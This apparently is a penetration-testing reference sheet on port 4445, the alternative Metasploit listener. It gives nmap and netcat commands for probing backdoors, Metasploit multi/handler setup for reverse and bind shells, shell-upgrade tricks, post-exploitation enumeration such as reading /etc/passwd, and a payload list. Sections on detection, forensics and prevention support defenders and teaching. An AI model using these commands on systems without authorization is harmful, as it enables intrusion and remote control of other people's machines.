# METASPLOIT ALTERNATIVE LISTENER (Port 4445/TCP)

## SERVICE OVERVIEW
```
Port 4445/TCP - Alternative Metasploit listener port
- Common alternative to port 4444
- Used for reverse/bind shells
- May indicate compromised system with backdoor
- Not a legitimate service in production
```

## BANNER GRABBING & DETECTION
```bash
nmap -sV -p4445 <IP>                            # Service/Version detection
nc -nv <IP> 4445                                # Manual connection
telnet <IP> 4445                                # Alternative connection
```

## NMAP ENUMERATION
```bash
# Basic scan
nmap -sV -p4445 <IP>                            # Version detection
nmap -p4444,4445 --script banner <IP>           # Both common Metasploit ports

# Combined scan
nmap -sV -p4444,4445,31337,5555 <IP> -oA backdoor_scan  # Common backdoor ports
```

## IDENTIFY BACKDOOR TYPE
```bash
# Connect and check behavior
nc -nv <IP> 4445

# Test for shell
echo "whoami" | nc -nv <IP> 4445
echo "id" | nc -nv <IP> 4445
echo "uname -a" | nc -nv <IP> 4445

# Check if it's HTTP-based backdoor
curl -v http://<IP>:4445/
curl -v http://<IP>:4445/shell
```

## METASPLOIT MULTI/HANDLER
```bash
# If you're the attacker setting up listener:
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_IP>
set LPORT 4445                                  # Alternative port
exploit -j

# Or for bind shell connection:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST <target_IP>
set LPORT 4445
exploit
```

## BIND SHELL EXPLOITATION
```bash
# If port 4445 is OPEN (listening), it's likely a BIND shell

# Connect to bind shell
nc -nv <IP> 4445
rlwrap nc -nv <IP> 4445                         # With readline support

# Windows bind shell
nc -nv <IP> 4445
> whoami
> ipconfig
> net user

# Linux bind shell
nc -nv <IP> 4445
> whoami
> id
> uname -a
```

## UPGRADE TO INTERACTIVE SHELL
```bash
# After connecting to basic shell:

# Python PTY (Linux)
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Fully interactive shell
# Ctrl+Z (background netcat)
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

## COMMON BACKDOOR PORTS
```
4444  - Metasploit default
4445  - Metasploit alternative ← THIS PORT
4446  - Metasploit alternative 2
5555  - Common backdoor / Android ADB
6666  - Common backdoor
8080  - HTTP backdoor
9999  - Common backdoor
31337 - Elite (1337) backdoor
12345 - NetBus trojan
```

## POST-EXPLOITATION
```bash
# After connecting to backdoor:

# System enumeration
whoami && id
hostname
uname -a                                        # Linux
systeminfo                                      # Windows

# Network enumeration
ip a                                            # Linux
ipconfig /all                                   # Windows
netstat -ano                                    # Network connections

# User enumeration
cat /etc/passwd                                 # Linux
net user                                        # Windows

# Privilege check
sudo -l                                         # Linux
whoami /priv                                    # Windows

# Find privilege escalation vectors
find / -perm -4000 2>/dev/null                  # SUID binaries (Linux)
icacls C:\                                      # File permissions (Windows)
```

## COMMON MISCONFIGURATIONS
```
☐ Backdoor listener left running on production
☐ No firewall blocking port 4445
☐ Backdoor accessible from external networks
☐ No IDS/IPS detecting reverse shell traffic
☐ Compromised system not detected
☐ Default Metasploit ports used (easily detected)
☐ No network monitoring/anomaly detection
```

## QUICK WIN CHECKLIST
```
☐ Check if port 4445 is open (nmap scan)
☐ Attempt to connect with netcat
☐ Test for shell access (whoami, id, etc.)
☐ Upgrade to interactive shell
☐ Enumerate system (OS, users, network)
☐ Check for privilege escalation vectors
☐ Document indicators of compromise (IOC)
☐ Identify how backdoor was installed
☐ Remove backdoor and investigate breach
```

## ONE-LINER CONNECTION
```bash
# Quick connection test
nc -nv <IP> 4445 <<< "whoami"

# Interactive connection
rlwrap nc -nv <IP> 4445
```

## SECURITY IMPLICATIONS
```
RISKS:
- Active backdoor on system (critical!)
- Unauthorized remote access
- Data exfiltration possible
- Lateral movement to other systems
- Persistence mechanism may exist
- Compromised credentials
- Potential ongoing attack

INDICATORS OF COMPROMISE:
- Port 4445 listening on system
- Unusual processes (nc, ncat, meterpreter)
- Outbound connections to suspicious IPs
- Modified system files
- New user accounts
- Suspicious scheduled tasks/cron jobs

IMMEDIATE ACTIONS:
- Isolate affected system from network
- Kill suspicious processes
- Check all running processes and network connections
- Review system logs for entry point
- Identify scope of compromise
- Change all credentials
- Restore from known good backup if available
- Conduct full forensic analysis
```

## DEFENSIVE DETECTION
```bash
# On Linux system, check for port 4445 listener:
netstat -tulpn | grep 4445
ss -tulpn | grep 4445
lsof -i :4445

# Check process listening on 4445
lsof -i :4445 -t                                # Get PID
ps aux | grep $(lsof -i :4445 -t)              # Process details

# Check for suspicious processes
ps aux | grep -E "nc|ncat|netcat|meterpreter"
ps aux | grep -i metasploit

# Check for outbound connections
netstat -anp | grep ESTABLISHED
ss -tnp | grep ESTABLISHED

# Kill backdoor process
kill -9 $(lsof -i :4445 -t)
```

## METASPLOIT PAYLOAD TYPES
```bash
# Common payloads using port 4445:

# Windows reverse shell
windows/meterpreter/reverse_tcp LPORT=4445
windows/shell/reverse_tcp LPORT=4445

# Windows bind shell
windows/meterpreter/bind_tcp LPORT=4445
windows/shell/bind_tcp LPORT=4445

# Linux reverse shell
linux/x86/meterpreter/reverse_tcp LPORT=4445
linux/x64/meterpreter/reverse_tcp LPORT=4445

# Generic shells
cmd/unix/reverse LPORT=4445
cmd/windows/reverse_powershell LPORT=4445
```

## FORENSICS & INVESTIGATION
```bash
# If you find port 4445 open:

# 1. Identify process
lsof -i :4445
netstat -tulpn | grep 4445

# 2. Check process details
ps aux | grep <PID>
ls -l /proc/<PID>/exe                           # Binary location
cat /proc/<PID>/cmdline                         # Command line
ls -l /proc/<PID>/fd/                           # File descriptors

# 3. Check when process started
ls -l /proc/<PID>                               # Process start time
ps -o lstart,cmd -p <PID>

# 4. Check network connections
lsof -p <PID> -i
netstat -anp | grep <PID>

# 5. Dump process memory
gcore <PID>                                     # Create core dump
strings core.<PID> | grep -E "password|user|key"

# 6. Kill and remove
kill -9 <PID>
rm /path/to/backdoor

# 7. Check persistence mechanisms
cat /etc/rc.local
crontab -l
ls /etc/systemd/system/
cat ~/.bash_profile
```

## PREVENTION
```
- Implement egress filtering (block outbound 4445)
- Use IDS/IPS to detect reverse shell patterns
- Monitor for processes listening on unusual ports
- Baseline normal network behavior
- Regular vulnerability scanning
- Patch management
- Application whitelisting
- Network segmentation
- Security awareness training
- Incident response plan
- EDR (Endpoint Detection and Response) solution
```

## TOOLS
```bash
# Netcat
nc -nv <IP> 4445
rlwrap nc -nv <IP> 4445

# Nmap
nmap -sV -p4445 <IP>

# Metasploit
use exploit/multi/handler
set PAYLOAD <payload>
set LPORT 4445
exploit

# Forensics
lsof -i :4445
netstat -tulpn | grep 4445
```

## REFERENCE
```bash
# For more on port 4444, see:
# SERVICE ENUM/4444 Metasploit.md

# All techniques for 4444 apply to 4445
# Common backdoor ports: 4444-4446, 5555, 6666, 8080, 9999, 31337
```
